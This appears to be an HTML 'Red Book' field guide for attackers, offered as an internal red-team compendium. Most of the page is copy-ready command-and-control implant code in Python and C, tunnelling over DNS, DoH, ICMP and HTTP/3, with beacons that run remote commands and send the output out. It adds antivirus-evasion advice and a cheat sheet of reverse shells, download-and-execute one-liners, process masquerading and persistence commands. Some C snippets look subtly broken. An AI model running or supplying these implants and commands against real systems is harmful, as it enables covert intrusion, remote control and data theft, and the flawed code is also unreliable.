@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>The Red Book · Operator's Final Compendium</title>
+    <style>
+        :root {
+            --bg: #0a0c10;
+            --panel: #0f1117;
+            --border: #2a2f3f;
+            --red: #ff4d4d;
+            --red-dim: #8b3a3a;
+            --green: #4caf50;
+            --cyan: #00d8ff;
+            --gold: #ffb347;
+            --text: #e0e0e0;
+            --text-dim: #8b92a8;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: 'Fira Code', 'Courier New', 'IBM Plex Mono', monospace;
+            line-height: 1.5;
+            padding: 1rem;
+        }
+
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(0deg, rgba(0,20,0,0.08) 0px, rgba(0,20,0,0.08) 2px, transparent 2px, transparent 6px);
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            background: var(--panel);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 2rem;
+            position: relative;
+            z-index: 2;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.4);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 2rem;
+            border-bottom: 2px solid var(--red-dim);
+            padding-bottom: 1rem;
+        }
+
+        .ascii {
+            color: var(--red);
+            font-size: 0.65rem;
+            white-space: pre;
+            font-family: monospace;
+            line-height: 1.2;
+            margin-bottom: 1rem;
+        }
+
+        h1 {
+            font-size: 2rem;
+            letter-spacing: 4px;
+        }
+
+        .tagline {
+            color: var(--text-dim);
+            font-size: 0.8rem;
+        }
+
+        .tabs {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+            margin-bottom: 2rem;
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 0.5rem;
+        }
+
+        .tab-btn {
+            background: none;
+            border: none;
+            color: var(--text-dim);
+            font-family: monospace;
+            font-size: 0.9rem;
+            padding: 0.5rem 1rem;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .tab-btn:hover { color: var(--cyan); }
+        .tab-btn.active { color: var(--cyan); border-bottom: 2px solid var(--cyan); }
+
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+
+        .section { margin-bottom: 2rem; }
+        .section-title {
+            font-size: 1.3rem;
+            margin-bottom: 1rem;
+            color: var(--cyan);
+            border-left: 3px solid var(--cyan);
+            padding-left: 0.8rem;
+        }
+
+        .card {
+            background: #0a0c10;
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            margin-bottom: 1rem;
+            overflow: hidden;
+        }
+
+        .card-header {
+            background: #12161f;
+            padding: 0.8rem 1rem;
+            cursor: pointer;
+            font-weight: bold;
+            color: var(--gold);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .card-header::before { content: "▶ "; display: inline-block; transition: transform 0.2s; }
+        .card.open .card-header::before { content: "▼ "; }
+        .card-content { display: none; padding: 1rem; border-top: 1px solid var(--border); }
+        .card.open .card-content { display: block; }
+
+        .code-block {
+            position: relative;
+            background: #0c1117;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            margin: 1rem 0;
+        }
+
+        .code-block pre {
+            padding: 1rem;
+            overflow-x: auto;
+            font-size: 0.8rem;
+            margin: 0;
+        }
+
+        .copy-btn {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.5rem;
+            background: var(--border);
+            border: none;
+            color: var(--text);
+            padding: 0.2rem 0.5rem;
+            border-radius: 3px;
+            cursor: pointer;
+            font-family: monospace;
+            font-size: 0.7rem;
+        }
+
+        .copy-btn:hover { background: var(--cyan); color: #000; }
+
+        .badge {
+            display: inline-block;
+            padding: 0.2rem 0.5rem;
+            border-radius: 3px;
+            font-size: 0.7rem;
+            font-weight: bold;
+            margin-right: 0.5rem;
+        }
+        .badge-python { background: #3776ab; color: #fff; }
+        .badge-c { background: #555; color: #fff; }
+        .badge-size { background: var(--gold); color: #000; }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1rem 0;
+            background: #0b1214;
+        }
+        th, td { border: 1px solid var(--border); padding: 0.6rem; text-align: left; }
+        th { background: #12161f; color: var(--cyan); }
+
+        .footer {
+            margin-top: 3rem;
+            text-align: center;
+            font-size: 0.7rem;
+            color: var(--text-dim);
+            border-top: 1px solid var(--border);
+            padding-top: 1.5rem;
+        }
+
+        @media (max-width: 700px) {
+            .container { padding: 1rem; }
+            .ascii { font-size: 0.35rem; }
+        }
+    
+        .internal-notice {
+            border: 2px solid var(--red);
+            background: linear-gradient(90deg, rgba(255,77,77,0.16), rgba(255,179,71,0.08));
+            padding: 0.9rem 1rem;
+            margin-bottom: 1.5rem;
+            text-align: center;
+            box-shadow: 0 0 18px rgba(255,77,77,0.15);
+        }
+        .notice-kicker {
+            color: var(--red);
+            font-weight: bold;
+            letter-spacing: 2px;
+            font-size: 1rem;
+        }
+        .notice-body {
+            color: var(--text);
+            font-size: 0.82rem;
+            margin-top: 0.35rem;
+        }
+        .pdf-toc {
+            border: 1px solid var(--border);
+            background: #0a0c10;
+            border-radius: 6px;
+            padding: 1rem;
+            margin-bottom: 1rem;
+        }
+        .pdf-toc-title {
+            color: var(--cyan);
+            font-weight: bold;
+            margin-bottom: 0.5rem;
+        }
+        .pdf-toc a, .tabs a {
+            color: var(--cyan);
+            text-decoration: none;
+            display: inline-block;
+            margin: 0.25rem 0.75rem 0.25rem 0;
+        }
+        .pdf-toc a:hover, .tabs a:hover { text-decoration: underline; }
+        @media print {
+            @page { size: Letter; margin: 0.35in; }
+            html, body { background: #0a0c10 !important; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+            body { padding: 0; font-size: 9pt; }
+            body::before { display: none; }
+            .container { max-width: none; border-radius: 0; padding: 0.35in; box-shadow: none; }
+            .ascii { font-size: 4.4pt; line-height: 1.05; }
+            h1 { font-size: 18pt; letter-spacing: 2px; }
+            .tagline { font-size: 7.5pt; }
+            .tabs { display: none; }
+            .pdf-toc { page-break-after: avoid; }
+            .tab-content { display: block !important; page-break-before: always; }
+            #opsec { page-break-before: auto; }
+            .card { break-inside: avoid; page-break-inside: avoid; }
+            .card-content { display: block !important; }
+            .card-header::before { content: "▼ "; }
+            .copy-btn { display: none; }
+            .code-block { break-inside: auto; page-break-inside: auto; }
+            .code-block pre, pre, code { white-space: pre-wrap !important; overflow-wrap: anywhere; word-break: break-word; }
+            table { table-layout: fixed; }
+            th, td { overflow-wrap: anywhere; word-break: break-word; }
+            a { color: var(--cyan); }
+        }
+
+    </style>
+</head>
+<body>
+<div class="container">
+
+    <div class="internal-notice" id="top-notice">
+        <div class="notice-kicker">EMPLOYEES ONLY · INTERNAL FIELD GUIDE</div>
+        <div class="notice-body">Rapid River Skunk Works Corporation / Secure I.T. U.P. internal use only. Authorized personnel only. Do not distribute outside approved employee channels.</div>
+    </div>
+
+    <div class="header">
+        <div class="ascii">
+╔══════════════════════════════════════════════════════════════════════════════════╗
+║                                                                                  ║
+║        ████████╗██╗  ██╗███████╗                                                ║
+║        ╚══██╔══╝██║  ██║██╔════╝                                                ║
+║           ██║   ███████║█████╗                                                  ║
+║           ██║   ██╔══██║██╔══╝                                                  ║
+║           ██║   ██║  ██║███████╗                                                ║
+║           ╚═╝   ╚═╝  ╚═╝╚══════╝                                                ║
+║                                                                                  ║
+║  ██████╗ ███████╗██████╗      ██████╗  ██████╗  ██████╗ ██╗  ██╗                ║
+║  ██╔══██╗██╔════╝██╔══██╗     ██╔══██╗██╔═══██╗██╔═══██╗██║ ██╔╝                ║
+║  ██████╔╝█████╗  ██║  ██║     ██████╔╝██║   ██║██║   ██║█████╔╝                 ║
+║  ██╔══██╗██╔══╝  ██║  ██║     ██╔══██╗██║   ██║██║   ██║██╔═██╗                 ║
+║  ██║  ██║███████╗██████╔╝     ██████╔╝╚██████╔╝╚██████╔╝██║  ██╗                ║
+║  ╚═╝  ╚═╝╚══════╝╚═════╝      ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝                ║
+║                                                                                  ║
+╚══════════════════════════════════════════════════════════════════════════════════╝
+        </div>
+        <h1>THE RED BOOK Volume 10: Final Compendium</h1>
+        <div class="tagline">FINAL COMPENDIUM · C2 TUNNELS · OPSEC TRADECRAFT · OPERATOR'S BIBLE</div>
+    </div>
+
+    <div class="tabs">
+        <a class="tab-btn active" data-tab="opsec" href="#opsec">🎭 OPSEC First</a>
+        <a class="tab-btn" data-tab="dns" href="#dns">🌐 DNS Tunnel</a>
+        <a class="tab-btn" data-tab="doh" href="#doh">🔒 DoH Tunnel</a>
+        <a class="tab-btn" data-tab="icmp" href="#icmp">📡 ICMP Tunnel</a>
+        <a class="tab-btn" data-tab="quic" href="#quic">⚡ HTTP/3 Tunnel</a>
+        <a class="tab-btn" data-tab="cheatsheet" href="#cheatsheet">📋 Quick Reference</a>
+    </div>
+
+    <!-- OPSEC Tab -->
+    <div id="opsec" class="tab-content active">
+        <div class="section">
+            <div class="section-title">The Stealth Trade-Off</div>
+            <div class="card">
+                <div class="card-header">Why "Bad Code" is Better for C2</div>
+                <div class="card-content">
+                    <p>A software engineer will tell you to add: error handling, retransmission, sequence numbers, connection pooling, logging, graceful degradation.</p>
+                    <p><strong>Don't.</strong> Each of those adds:</p>
+                    <ul>
+                        <li>Binary size → more signatures for AV</li>
+                        <li>Predictable behavior → easier to fingerprint</li>
+                        <li>Strings and error messages → detection surface</li>
+                        <li>Memory footprints → anomaly detection</li>
+                    </ul>
+                    <p>The best implants fail silently, reconnect with jitter, and look like broken software.</p>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-header">Anti-Patterns That Are Actually Good</div>
+                <div class="card-content">
+                    <table>
+                        <tr><th>"Bad" Practice</th><th>Why It's Good for C2</th></tr>
+                        <tr><td>No error checking</td><td>Silent failures don't alert defenders</td></tr>
+                        <tr><td>Hardcoded everything</td><td>No config file = no forensic artifact</td></tr>
+                        <tr><td>Tiny variable names (s, c, b)</td><td>No context for reverse engineers</td></tr>
+                        <tr><td>No logging</td><td>Nothing to find on disk</td></tr>
+                        <tr><td>Unexpected protocol behavior</td><td>Signature detection expects standard compliance</td></tr>
+                    </table>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-header">Size Matters: Binary Footprint</div>
+                <div class="card-content">
+                    <table>
+                        <tr><th>Approach</th><th>Size</th><th>Detectability</th><th>Reliability</th></tr>
+                        <tr><td>Minimal C (no deps)</td><td>1.5-3 KB</td><td>Very Low</td><td>Low</td></tr>
+                        <tr><td>Hybrid C (basic recovery)</td><td>6-12 KB</td><td>Low</td><td>Medium</td></tr>
+                        <tr><td>Production C (full features)</td><td>50-200 KB</td><td>High</td><td>High</td></tr>
+                        <tr><td>Python script</td><td>500 B - 2 KB</td><td>Medium (requires interpreter)</td><td>Low</td></tr>
+                    </table>
+                </div>
+            </div>
+        </div>
+        <div class="section">
+            <div class="section-title">OPSEC-Driven Development Rules</div>
+            <div class="card">
+                <div class="card-header">The 7 Commandments of Implant Coding</div>
+                <div class="card-content">
+                    <ol>
+                        <li><strong>No error messages</strong> – ever. Fail silently or exit.</li>
+                        <li><strong>No logging</strong> – nothing written to disk unless required.</li>
+                        <li><strong>Jitter everything</strong> – sleeps, reconnects, beacon intervals.</li>
+                        <li><strong>Exponential backoff</strong> – don't hammer failed connections.</li>
+                        <li><strong>Masquerade or stay small</strong> – either blend in or be invisible.</li>
+                        <li><strong>No unnecessary dependencies</strong> – static link or pure system calls.</li>
+                        <li><strong>Strings kill</strong> – XOR or obfuscate any static string.</li>
+                    </ol>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- DNS TUNNEL Tab -->
+    <div id="dns" class="tab-content">
+        <div class="section-title">DNS Tunnel · Python</div>
+        <div class="code-block"><button class="copy-btn">Copy</button><pre>#!/usr/bin/env python3
+import socket, struct, base64, time, random, threading
+DOMAIN, PORT = "c2.yourdomain.com", 53
+
+def build_dns_response(qid, domain, data):
+    header = struct.pack('!HHHHHH', qid, 0x8180, 1, 1, 0, 0)
+    qparts = domain.encode().split(b'.')
+    q = b''.join(bytes([len(p)]) + p for p in qparts) + b'\x00' + struct.pack('!HH', 16, 1)
+    a = b''.join(bytes([len(p)]) + p for p in qparts) + b'\xc0\x0c'
+    a += struct.pack('!HHI', 16, 1, 60)
+    a += struct.pack('!H', len(data) + 1) + bytes([len(data)]) + data.encode()
+    return header + q + a
+
+def handle(data, addr, sock):
+    qid = struct.unpack('!H', data[:2])[0]
+    resp = build_dns_response(qid, "cmd.data", "whoami")
+    sock.sendto(resp, addr)
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+sock.bind(('0.0.0.0', PORT))
+print(f"[+] DNS C2 on {PORT}")
+while True:
+    d, a = sock.recvfrom(512)
+    threading.Thread(target=handle, args=(d, a, sock)).start()</pre></div>
+
+        <div class="section-title">DNS Tunnel · C (Minimal Client)</div>
+        <div class="code-block"><button class="copy-btn">Copy</button><pre>// gcc -Os -s -static -o dns_beacon dns_beacon.c
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;time.h&gt;
+
+#define H "8.8.8.8"
+#define D "c2.yourdomain.com"
+#define P 53
+
+int s, i, r, l=512;
+char b[512], *c, o[4096];
+struct sockaddr_in a;
+
+void x(char *d) {
+    int p=12;
+    for(i=0;i<4;i++) b[i]=rand()&0xFF;
+    b[2]=1; b[5]=1; b[7]=1;
+    sprintf(b+p,"\x01%s",d);
+    p+=strlen(d)+2;
+    b[p++]=0; b[p++]=0x10; b[p++]=0; b[p++]=1;
+    sendto(s,b,p,0,(void*)&a,sizeof(a));
+}
+
+int main() {
+    srand(time(0));
+    s=socket(AF_INET,SOCK_DGRAM,0);
+    a.sin_family=AF_INET;
+    a.sin_port=htons(P);
+    inet_pton(AF_INET,H,&a.sin_addr);
+    while(1) {
+        x("beacon");
+        r=recvfrom(s,b,l,0,0,0);
+        if(r>0 && (c=memchr(b+12,0,l-12))) {
+            c++;
+            if(*c==16) { c+=8; if(*c) c++; *c=0;
+                if(strcmp(c,"q")) {
+                    FILE *p=popen(c,"r");
+                    if(p) { o[0]=0; while(fgets(o+strlen(o),4000,p)); pclose(p); x(o); }
+    }   }   }
+    sleep(25+rand()%15);
+} }</pre></div>
+    </div>
+
+    <!-- DoH Tunnel Tab -->
+    <div id="doh" class="tab-content">
+        <div class="section-title">DNS over HTTPS · Python</div>
+        <div class="code-block"><button class="copy-btn">Copy</button><pre>import urllib.request, base64, subprocess, time, json, random
+D, H = "c2.yourdomain.com", "https://cloudflare-dns.com/dns-query?name="
+def q(t):
+    try:
+        r = urllib.request.urlopen(f"{H}{t}.{D}&type=TXT")
+        return json.load(r)["Answer"][0]["data"].strip('"')
+    except: return None
+while 1:
+    c = q("0.data")
+    if c and c != "ping":
+        o = base64.b64encode(subprocess.getoutput(c).encode()).decode()
+        for j in range(0,len(o),50): q(f"{o[j:j+50]}.data")
+    time.sleep(30 + random.randint(0, 30))</pre></div>
+
+        <div class="section-title">DoH · C (using curl)</div>
+        <div class="code-block"><button class="copy-btn">Copy</button><pre>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;time.h&gt;
+// Requires libcurl: gcc -o doh_beacon doh_beacon.c -lcurl
+int main() {
+    char cmd[512], out[4096];
+    srand(time(0));
+    while(1) {
+        snprintf(cmd, sizeof(cmd), "curl -s 'https://cloudflare-dns.com/dns-query?name=beacon.c2.com&type=TXT' 2>/dev/null | grep -oP '(?&lt;=\")[^\"]+' | head -1", 0);
+        FILE *fp = popen(cmd, "r");
+        if(fp && fgets(cmd, sizeof(cmd), fp)) {
+            cmd[strcspn(cmd, "\n")] = 0;
+            if(strcmp(cmd, "ping") && strcmp(cmd, "quit")) {
+                FILE *ep = popen(cmd, "r");
+                if(ep) { out[0]=0; while(fgets(out+strlen(out), sizeof(out)-strlen(out), ep)); pclose(ep);
+                snprintf(cmd, sizeof(cmd), "curl -s 'https://cloudflare-dns.com/dns-query?name=%s.data.c2.com&type=TXT' >/dev/null 2>&1", out); system(cmd); }
+            }
+        }
+        sleep(30 + rand()%30);
+    }
+}</pre></div>
+    </div>
+
+    <!-- ICMP Tunnel Tab -->
+    <div id="icmp" class="tab-content">
+        <div class="section-title">ICMP Tunnel · Python (requires root)</div>
+        <div class="code-block"><button class="copy-btn">Copy</button><pre>#!/usr/bin/env python3
+import socket, struct, os, time, random, subprocess, base64
+HOST, ID = "c2.yourdomain.com", os.getpid() & 0xFFFF
+s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+def icmp(data, seq):
+    pkt = struct.pack('!BBHHH', 8, 0, 0, seq, ID) + data.encode()[:100]
+    s.sendto(pkt, (HOST, 0))
+    return s.recvfrom(1024)[0][28:]
+while 1:
+    r = icmp("BEACON:" + os.uname().nodename, 1)
+    if len(r) > 8:
+        cmd = r[8:].split(b'\x00',1)[0].decode()
+        if cmd and cmd != "ping":
+            out = subprocess.getoutput(cmd)
+            for i in range(0, len(out), 100): icmp(out[i:i+100], i//100+1)
+    time.sleep(30 + random.randint(0, 30))</pre></div>
+
+        <div class="section-title">ICMP · C Minimal</div>
+        <div class="code-block"><button class="copy-btn">Copy</button><pre>// gcc -Os -s -static -o icmp_beacon icmp_beacon.c
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/ip_icmp.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;time.h&gt;
+#define H "c2.yourdomain.com"
+int s; struct sockaddr_in a;
+void icmp(char *d, int seq) {
+    char p[128]; struct icmphdr *icmp=(struct icmphdr*)p;
+    icmp->type=8; icmp->code=0; icmp->checksum=0; icmp->un.echo.id=getpid()&0xFFFF; icmp->un.echo.sequence=seq;
+    strcpy(p+sizeof(struct icmphdr), d); sendto(s,p,64,0,(void*)&a,sizeof(a));
+}
+int main() {
+    srand(time(0)); s=socket(AF_INET,SOCK_RAW,IPPROTO_ICMP);
+    a.sin_family=AF_INET; a.sin_port=0; inet_pton(AF_INET,H,&a.sin_addr);
+    char b[512]; while(1) {
+        icmp("BEACON",1); recvfrom(s,b,512,0,0,0);
+        sleep(30+rand()%30);
+} }</pre></div>
+    </div>
+
+    <!-- HTTP/3 Tunnel Tab -->
+    <div id="quic" class="tab-content">
+        <div class="section-title">HTTP/3 (QUIC) · Python (aioquic required)</div>
+        <div class="code-block"><button class="copy-btn">Copy</button><pre># pip install aioquic
+import asyncio, subprocess, base64, random
+from aioquic.asyncio.client import connect
+from aioquic.h3.connection import H3Connection
+async def beacon():
+    async with connect("c2.yourdomain.com", 4433) as conn:
+        h3 = H3Connection(conn)
+        while True:
+            await h3.send_headers([(b":method", b"GET"), (b":path", b"/beacon")])
+            data = await h3.receive_data()
+            cmd = data.decode()
+            if cmd and cmd != "ping":
+                out = base64.b64encode(subprocess.getoutput(cmd).encode()).decode()
+                await h3.send_headers([(b":method", b"POST"), (b":path", b"/data")])
+                await h3.send_data(out.encode())
+            await asyncio.sleep(30 + random.randint(0, 30))
+asyncio.run(beacon())</pre></div>
+    </div>
+
+    <!-- Cheat Sheet Tab -->
+    <div id="cheatsheet" class="tab-content">
+        <div class="section-title">Quick Reference</div>
+        <div class="card"><div class="card-header">One-Liners</div><div class="card-content">
+            <table>
+                <tr><th>Task</th><th>Command</th></tr>
+                <tr><td>Linux reverse shell</td><td><code>bash -i >& /dev/tcp/IP/4433 0>&1</code></td></tr>
+                <tr><td>Windows PS reverse</td><td><code>powershell -c "$c=New-Object Net.Sockets.TCPClient('IP',4433);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne0){$d=([text.encoding]::ASCII).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"</code></td></tr>
+                <tr><td>Python reverse</td><td><code>python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",4433));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.execve("/bin/sh",["sh"],os.environ)'</code></td></tr>
+                <tr><td>Download & exec (Linux)</td><td><code>curl -s http://C2/p.sh | bash</code></td></tr>
+                <tr><td>Download & exec (Windows)</td><td><code>powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://C2/p.ps1')"</code></td></tr>
+                <tr><td>DNS tunnel query</td><td><code>dig +short txt data.c2.com</code></td></tr>
+                <tr><td>ICMP ping data</td><td><code>ping -c 1 -p $(echo -n "cmd" | xxd -ps) C2</code></td></tr>
+                <tr><td>Process hiding (Linux)</td><td><code>exec -a "[kworker]" ./beacon</code></td></tr>
+                <tr><td>Process hiding (Windows)</td><td><code>copy beacon.exe C:\Windows\System32\svchost.exe & svchost.exe</code></td></tr>
+                <tr><td>Persistence (cron)</td><td><code>(crontab -l; echo "@reboot /path/b") | crontab -</code></td></tr>
+                <tr><td>Persistence (reg)</td><td><code>reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v B /d "C:\b.exe"</code></td></tr>
+            </table>
+        </div></div>
+        <div class="section-title">Build Commands</div>
+        <div class="card"><div class="card-header">Compilation</div><div class="card-content">
+            <pre># Minimal C (stripped, static)
+gcc -Os -ffunction-sections -fdata-sections -Wl,--gc-sections -s -static -o beacon beacon.c
+
+# UPX compression (reduces size 50-70%)
+upx --best --ultra-brute beacon
+
+# Cross-compile for Windows (Linux host)
+x86_64-w64-mingw32-gcc -Os -s -static -o beacon.exe beacon.c -lws2_32</pre>
+        </div></div>
+    </div>
+
+    <div class="footer">
+        THE RED BOOK · OPERATOR'S FINAL COMPENDIUM · AUTHORIZED USE ONLY<br>
+        For educational and authorized red team exercises. Know the laws in your jurisdiction.
+    </div>
+</div>
+
+<script>
+    // Tab switching
+    document.querySelectorAll('.tab-btn').forEach(btn => {
+        btn.addEventListener('click', (e) => { e.preventDefault();
+            const tabId = btn.getAttribute('data-tab');
+            document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
+            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+            document.getElementById(tabId).classList.add('active');
+            btn.classList.add('active');
+        });
+    });
+
+    // Card expand/collapse
+    document.querySelectorAll('.card-header').forEach(header => {
+        header.addEventListener('click', () => header.parentElement.classList.toggle('open'));
+    });
+
+    // Copy buttons
+    document.querySelectorAll('.copy-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            const pre = btn.parentElement.querySelector('pre');
+            const text = pre.innerText;
+            navigator.clipboard.writeText(text).then(() => {
+                const orig = btn.innerText;
+                btn.innerText = '✓ Copied!';
+                setTimeout(() => btn.innerText = orig, 1500);
+            });
+        });
+    });
+</script>
+</body>
+</html>
